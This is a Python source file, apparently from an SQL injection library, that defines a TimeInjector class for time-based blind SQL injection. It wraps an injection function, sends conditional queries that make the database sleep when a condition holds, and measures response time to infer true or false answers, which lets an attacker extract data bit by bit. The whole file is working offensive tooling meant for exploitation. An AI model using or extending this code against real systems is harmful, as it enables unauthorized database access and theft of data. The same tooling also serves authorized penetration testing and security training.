from __future__ import annotations
from sqlinjectlib._sqlinjectlib import InjectorFunction
from sqlinjectlib._blindinject import BlindInjector
from sqlinjectlib._databases import DatabaseType, MySQL
from sqlinjectlib._typedql import SQL
from sqlinjectlib._utils import wrap
from time import time


class TimeInjector(BlindInjector):
    """Time based SQL injection

    You have a time based SQL injection when you can pause the database for some seconds if a boolean query is true
    """

    def __init__(
        self,
        injector: InjectorFunction[SQL[int], None],
        /,
        *,
        concurrent: bool = False,
        database_type: DatabaseType = MySQL(),
        interval: int = 5,
    ):
        """
        - injector: function that given a boolean query pauses the execution for interval time if the condition is true
        - concurrent: if the function can be called multiple times concurrently to speed up
        - database_type: the type of the database you are injecting into
        - interval: the time that has to pass to consider the query true
        """
        self.__injector = wrap(injector)
        self.__interval = interval
        super().__init__(
            self.__call, database_type=database_type, concurrent=concurrent
        )

    async def __call(self, query: SQL[bool]) -> bool:
        start = time()
        await self.__injector(
            self.database_type.if_else(
                query, self.database_type.sleep(SQL.int(self.__interval)), SQL.none()
            )
        )
        delta = time() - start
        return delta > self.__interval
